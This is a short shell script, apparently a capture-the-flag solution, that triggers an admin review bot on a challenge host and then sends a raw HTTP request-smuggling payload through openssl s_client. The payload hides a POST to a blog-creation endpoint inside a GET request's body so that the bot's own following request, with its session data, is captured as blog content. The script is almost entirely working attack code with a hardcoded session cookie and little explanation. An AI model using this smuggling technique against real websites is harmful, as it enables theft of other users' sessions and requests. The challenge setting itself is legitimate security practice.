#!/bin/sh
host=crossing-boundaries.ctf.prgy.in
port=443
pubbid=b3919dba-c247-456f-9543-aae9cfe34d53
mybid=60244d97-fdf2-4346-9ff6-9f7c1e638697
cookie="Cookie: session=6922edb2-586f-4ac7-9ed8-9c2dc187915e"
bot_cl=231 # aprx (but always less) calculated request size of admin bot

echo Triggering Admin Bot
# After 10s, the admin bot will review the blog and trigger the XSS
curl -X POST "https://$host/my-blogs/$mybid/review" \
  -H "$cookie" \
  --silent --output /dev/null

echo Triggered Admin Bot
sleep 6

echo Sending payload
smuggled="POST /my-blogs/create HTTP/1.1\r\nHost: $host\r\n$cookie\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $bot_cl\r\n\r\ncontent="
payload="GET /blogs/$pubbid HTTP/1.1\r\nHost: $host\r\n$cookie\r\nContent-Length: $(echo -n $smuggled | wc -c)\r\n\r\n$smuggled"

echo -n "$payload" | openssl s_client -connect $host:$port -quiet 2>/dev/null &

sleep 5
echo Done
